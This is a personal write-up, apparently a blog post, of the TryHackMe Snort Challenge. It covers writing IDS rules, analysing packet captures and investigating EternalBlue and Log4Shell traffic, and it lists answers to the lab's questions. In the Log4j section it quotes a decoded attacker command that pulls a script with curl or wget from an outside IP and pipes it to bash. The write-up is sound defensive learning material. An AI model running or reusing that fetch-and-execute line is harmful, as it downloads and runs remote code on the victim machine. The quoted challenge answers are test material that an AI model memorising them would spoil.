```
  ____                   _      ____ _           _ _                       
 / ___| _ __   ___  _ __| |_   / ___| |__   __ _| | | ___ _ __   __ _  ___ 
 \___ \| '_ \ / _ \| '__| __| | |   | '_ \ / _` | | |/ _ \ '_ \ / _` |/ _ \
  ___) | | | | (_) | |  | |_  | |___| | | | (_| | | |  __/ | | | (_| |  __/
 |____/|_| |_|\___/|_|   \__|  \____|_| |_|\__,_|_|_|\___|_| |_|\__, |\___|
                                                               |___/      
        🔍 Mastering Network Intrusion Detection with Snort
```

---

# 🛡️ Snort Challenge - The Basics: My IDS Adventure

> *"The room invites you a challenge to investigate a series of traffic data and stop malicious activity under two different scenarios. Let's start working with Snort to analyse live and captured traffic."* — TryHackMe

This challenge was my deep dive into **Snort**, the open-source Network Intrusion Detection System (NIDS). Through multiple tasks, I learned to write custom IDS rules, analyze network traffic, and detect various types of malicious activities.

---

## 🎯 Challenge Overview

The Snort Challenge tested my ability to:
- Write effective IDS rules for different protocols
- Analyze network packet captures (PCAPs)
- Detect file transfers and malicious payloads
- Troubleshoot rule syntax errors
- Investigate real-world vulnerabilities like MS17-010 and Log4j

⚠️ **Note:** IP addresses and log file names may vary as I completed this challenge over multiple sessions.

---

## 📋 Task Breakdown & Solutions

### 🌐 TASK 2: Writing IDS Rules (HTTP)

**Objective:** Detect TCP port 80 traffic and analyze packet details.

#### Key Learning: Bidirectional Traffic Detection
I discovered that detecting traffic "from or to" a specific port requires special syntax:

```bash
# Two separate rules approach:
alert tcp any 80 -> any any (msg:"TCP Port 80 Scan"; sid:1000001; rev:1;)
alert tcp any any -> any 80 (msg:"TCP Port 80 Scan"; sid:1000002; rev:1;)

# Single bidirectional rule (preferred):
alert tcp any 80 <> any any (msg:"TCP Port 80 Scan"; sid:1000001; rev:1;)
```

**Results:** Successfully detected **164 TCP packets** from the total 460 packets.

**Packet Analysis Highlights:**
- Packet 63 destination: `216.239.59.99`
- Packet 64 ACK number: `0x2E6B5384`
- Packet 62 SEQ number: `0x36C21E28`
- Packet 65 TTL: `128` (indicating Windows system)

---

### 📁 TASK 3: Writing IDS Rules (FTP)

**Objective:** Analyze FTP traffic and detect authentication attempts.

#### Rule for All FTP Traffic:
```bash
alert tcp any 21 <> any any (msg:"all TCP port 21 scan"; sid:1000001; rev:1;)
```

#### Investigation Techniques:
```bash
# Extract readable strings from binary log
sudo strings snort.log.xxx > readable.log

# Search for FTP service information
grep -i "ftp" readable.log
```

**Key Discoveries:**
- **FTP Service:** Microsoft FTP Service
- **Failed logins:** 41 attempts (530 User responses)
- **Successful logins:** 1 attempt (230 User response)
- **Valid username attempts:** 42 (331 Password responses)

#### Advanced Rule with Content Filtering:
```bash
alert tcp any 21 <> any any (msg:"FTP Administrator Scan with no password"; 
    content:"USER Administrator"; content:!"PASS"; sid:1000001; rev:1;)
```

---

### 🖼️ TASK 4: Writing IDS Rules (PNG)

**Objective:** Detect PNG and GIF files using magic byte signatures.

#### PNG File Detection:
PNG files start with magic bytes: `89 50 4E 47 0D 0A 1A 0A`

```bash
alert tcp any any <> any any (msg: "PNG Scan"; 
    content:"|89 50 4E 47 0D 0A 1A 0A|"; sid: 100002; rev:1;)
```

**Discovery:** Embedded software - **Adobe ImageReady**

#### GIF File Detection:
GIF has two possible signatures:
```bash
# GIF87a
alert tcp any any <> any any (msg: "Gif87a Scan"; 
    content:"|47 49 46 38 37 61|"; sid: 100002; rev:1;)

# GIF89a  
alert tcp any any <> any any (msg: "Gif89a Scan"; 
    content:"|47 49 46 38 39 61|"; sid: 100003; rev:1;)
```

**Discovery:** Image format - **GIF89a**

---

### 🌊 TASK 5: Writing IDS Rules (Torrent Metafile)

**Objective:** Detect BitTorrent traffic and analyze torrent metadata.

```bash
alert tcp any any <> any any (msg:"Torrent Metafile Scan"; 
    content:".torrent"; sid:1000001; rev:1;)
```

**Investigation Results:**
- **Detected packets:** 2
- **Application:** bittorrent
- **MIME type:** application/x-bittorrent
- **Hostname:** tracker2.torrentbox.com

---

### 🔧 TASK 6: Troubleshooting Rule Syntax Errors

This task taught me common Snort rule syntax mistakes:

#### Common Errors Fixed:
1. **Missing spaces:** `any(` → `any (`
2. **Missing port numbers:** `any ->` → `any any ->`
3. **Duplicate SIDs:** Each rule needs unique sid numbers
4. **Wrong separators:** `:` vs `;` in rule options
5. **Invalid direction:** `<-` → `->`
6. **Case sensitivity:** Added `nocase` option
7. **Missing msg field:** Every rule needs a message

---

### ⚔️ TASK 7: Using External Rules (MS17-010)

**Objective:** Investigate the infamous EternalBlue vulnerability.

#### Key Challenge: Escaping Special Characters
The `\IPC$` string required proper escaping:
```bash
alert tcp any any <> any any (msg: "Detecting Payloads with \IPC$"; 
    content: "\\IPC$"; sid:1000001; rev:1;)
```

**Investigation Results:**
- **Total packets:** 25,154
- **IPC$ detections:** 12 packets  
- **Requested path:** `\\192.168.116.138\IPC$`
- **CVE:** CVE-2017-0144 (EternalBlue)
- **CVSS v2 Score:** 9.3 (Critical)

---

### 🪵 TASK 8: Using External Rules (Log4j)

**Objective:** Analyze the critical Log4Shell vulnerability.

#### Payload Size Detection:
```bash
alert tcp any any <> any any (msg: "Detecting file with expected payload byte range"; 
    dsize:770<>855; sid:1000001; rev:1;)
```

**Investigation Highlights:**
- **Total detections:** 26 packets
- **Unique rules triggered:** 4
- **Rule SID prefix:** 210037
- **Payload size range:** 41 packets between 770-855 bytes
- **Encoding:** Base64
- **IP ID:** 62808

#### Decoded Malicious Command:
```bash
(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
```

**CVE Analysis:**
- **Vulnerability:** CVE-2021-44228 (Log4Shell)
- **CVSS v2 Score:** 9.3 (Critical)

---

## 🎓 Key Skills Developed

### **Technical Proficiencies:**
- **Snort Rule Writing:** Content matching, protocol detection, bidirectional rules
- **Traffic Analysis:** PCAP investigation, packet header analysis
- **File Signature Detection:** Magic byte identification for various file types
- **Log Analysis:** Using `strings`, `grep`, and `wc` commands effectively
- **Vulnerability Research:** CVE analysis and CVSS scoring

### **Security Insights:**
- **Network Protocols:** Deep understanding of HTTP, FTP, SMB, and TCP/IP
- **Attack Patterns:** Recognizing brute force, file exfiltration, and exploit signatures
- **Malware Detection:** Identifying suspicious payloads and command injection
- **Incident Response:** Systematic approach to traffic investigation

---

## 🔍 Investigation Methodology

### **My Standard Approach:**
1. **Rule Creation** → Write targeted Snort rules
2. **Traffic Analysis** → Run Snort against PCAP files  
3. **Log Processing** → Extract readable strings from binary logs
4. **Pattern Matching** → Use grep for specific indicators
5. **Evidence Collection** → Document findings and IOCs

### **Essential Commands Used:**
```bash
# Run Snort with custom rules
sudo snort -c local.rules -A full -l . -r capture.pcap

# Extract readable strings
sudo strings snort.log.xxx > readable.log

# Search and count patterns
grep -i "pattern" readable.log | wc -l

# Read detailed packet information  
sudo snort -r snort.log.xxx -X -n [packet_number]
```

---

## 📊 Challenge Statistics

| Task | Focus Area | Rules Written | Packets Detected |
|------|-----------|---------------|------------------|
| 2 | HTTP Traffic | 1 | 164 |
| 3 | FTP Analysis | 4 | 307 total |
| 4 | File Detection | 3 | PNG/GIF files |
| 5 | Torrent Traffic | 1 | 2 |
| 6 | Troubleshooting | 7 fixes | Various |
| 7 | MS17-010 | 2 | 25,154 |
| 8 | Log4j | 2 | 26 |

---

## 🚀 Real-World Applications

This challenge demonstrated how Snort is used in production environments:

### **SOC Operations:**
- Real-time threat detection and alerting
- Custom rule development for emerging threats
- Traffic pattern analysis and anomaly detection

### **Incident Response:**
- Forensic analysis of network captures
- Malware communication detection
- Attack timeline reconstruction

### **Threat Hunting:**
- Proactive searching for IOCs in network traffic  
- Custom signature development
- Advanced persistent threat (APT) detection

---

## 🏆 Challenge Reflection

The **Snort Challenge - The Basics** was an intensive hands-on experience that transformed my understanding of network security monitoring. From writing simple port-based rules to detecting sophisticated attacks like EternalBlue and Log4Shell, I gained practical skills that are immediately applicable in cybersecurity operations.

**Most Valuable Lessons:**
- The importance of proper rule syntax and testing
- How attackers use legitimate protocols for malicious purposes  
- The critical role of network monitoring in detecting threats
- Real-world application of vulnerability research and analysis

---

## 🎯 Next Steps

This challenge has prepared me for:
- Advanced Snort configurations and optimizations
- SIEM integration and alert management
- Custom signature development for emerging threats
- Network security architecture and design

---

✍️ *This blog documents my comprehensive journey through the TryHackMe Snort Challenge, showcasing practical network intrusion detection skills and real-world security analysis techniques.*

---